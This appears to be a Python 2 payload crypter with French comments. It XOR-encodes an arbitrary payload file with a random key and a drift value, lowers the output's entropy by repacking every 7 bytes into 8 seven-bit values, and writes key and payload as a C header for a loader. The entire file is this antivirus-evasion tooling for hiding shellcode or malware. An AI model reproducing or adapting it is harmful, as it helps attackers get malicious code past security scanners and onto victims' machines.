#!/usr/bin/python
import random
import sys

if __name__ == '__main__':
  # Charge le payload
  try:
    print ('Loading payload: %s' % sys.argv[1])
    f = open(sys.argv[1],'r')
    payload = bytearray(f.read())
    f.close()
    payload_len = len(payload)
    print ('Payload len: %d bytes' % (payload_len))
  except:
    print('Error opening file')
    exit(1)
 
  # genere une xor key de 32 chars
  key=[]
  for i in range(0,32):
    key.append(random.randrange(0xff)) 

  # Joli Print
  asciikey=''
  for i in key:
    asciikey = asciikey + str(hex(i)).partition('x')[2]
  print ('Xor key: %s' % (asciikey))

   
  # Xor le payload
  kidx = 0
  drift = 0
  for i in range(0, payload_len):
    #print ('%x %x %x %x' % (kidx,key[kidx] , payload[i] , drift))
    payload[i] = ((payload[i] ^ key[kidx]) + drift ) % 256
    drift = (drift+1) % 256
    kidx = (kidx + 1) % 32

  # Cree le padding anti antropie

  # Pad pour un payload avec une taille multiple de 7
  for i in range(0, (7-(len(payload) % 7))):
    payload.append(random.randrange(0xff))

  payload2 = []
  # Convert en 7 Bytes
  for b in range(0,len(payload) // 7):
    i = b*7
    a0 = payload[i]
    a1 = payload[i+1]
    a2 = payload[i+2]
    a3 = payload[i+3]
    a4 = payload[i+4]
    a5 = payload[i+5]
    a6 = payload[i+6]
  
    b0 = a0 & 127
    b1 = ((a0 & 128)  >> 7) | ((a1 & 63) << 1 )
    b2 = ((a1 &  192) >> 6 ) | ((a2 & 31) << 2)
    b3 = ((a2 &  224) >> 5 ) | ((a3 & 15) << 3)
    b4 = ((a3 &  240) >> 4 ) | ((a4 & 7) << 4)
    b5 = ((a4 &  248) >> 3 ) | ((a5 & 3) << 5)
    b6 = ((a5 &  252) >> 2 ) | ((a6 & 1) << 6)
    b7 = ((a6 &  254) >> 1 ) 
 
    #print ("%x %x %x %x %x %x %x %x = %x %x %x %x %x %x %x"% (b0,b1,b2,b3,b4,b5,b6,b7,a0,a1,a2,a3,a4,a5,a6))
    payload2.append(b0)
    payload2.append(b1)
    payload2.append(b2)
    payload2.append(b3)
    payload2.append(b4)
    payload2.append(b5)
    payload2.append(b6)
    payload2.append(b7)
  
  payload = payload2
  payload_len = len (payload)

  # Cree l'include file
  include = "int payloadlen =" + str(payload_len) + ";\n" 
  include = include + "unsigned char key[] =\n"
  line="         \""
  for i in key:
    line= line + "\\x" + str(hex(i)).partition('x')[2]
  line=line+"\";\n"
  include=include + line
  
  include = include + "unsigned char payload [] =\n"
  j = 0
  for i in range (0,(payload_len/16)):
    line="         \""
    for x in range( 0,16):
      line= line + "\\x" + str(hex(payload[j])).partition('x')[2]
      j=j+1
    line=line+"\"\n"
    include=include + line

  line="         \""
  for x in range( 0,(payload_len % 16)):
    line= line + "\\x" + str(hex(payload[j])).partition('x')[2]
    j=j+1
  include=include + line + "\";\n"

  with open('payload.h', 'w') as f:
      f.write(include)
  print ("Include file ready")

